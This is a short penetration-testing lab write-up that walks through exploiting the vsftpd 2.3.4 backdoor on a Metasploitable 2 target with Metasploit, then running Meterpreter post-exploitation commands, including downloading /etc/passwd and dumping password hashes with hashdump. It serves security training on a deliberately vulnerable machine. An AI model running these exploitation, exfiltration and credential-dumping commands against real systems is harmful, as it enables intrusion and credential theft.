# Lab 03 — Meterpreter Session and Advanced Post-Exploitation

## 1. Overview

This lab demonstrates obtaining a Meterpreter session and performing advanced post-exploitation activities.

Unlike a basic shell, Meterpreter provides enhanced interaction capabilities, including file transfer, credential dumping, and system control.

---

## 2. Lab Environment

Attacker Machine: Kali Linux  
Target Machine: Metasploitable 2  
Tool Used: Metasploit Framework (Meterpreter payload)

---

## 3. Service Detection

Service scan performed:

nmap -sV -p 21 <target-ip>

Result:

21/tcp open ftp vsftpd 2.3.4

---

## 4. Exploitation

Metasploit module used:

exploit/unix/ftp/vsftpd_234_backdoor

Execution:

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target-ip>
run -j

A session was successfully established.

---

## 5. Meterpreter Post-Exploitation

System enumeration:

sysinfo
getuid

File system interaction:

pwd
ls
download /etc/passwd

Credential extraction:

hashdump

Observations:

- Privilege level identified
- Sensitive files downloaded
- Credential hashes extracted
- Enhanced control compared to standard shell

---

## 6. Key Takeaways

- Differences between standard shell and Meterpreter
- Advanced post-exploitation techniques
- File exfiltration methods
- Credential dumping fundamentals
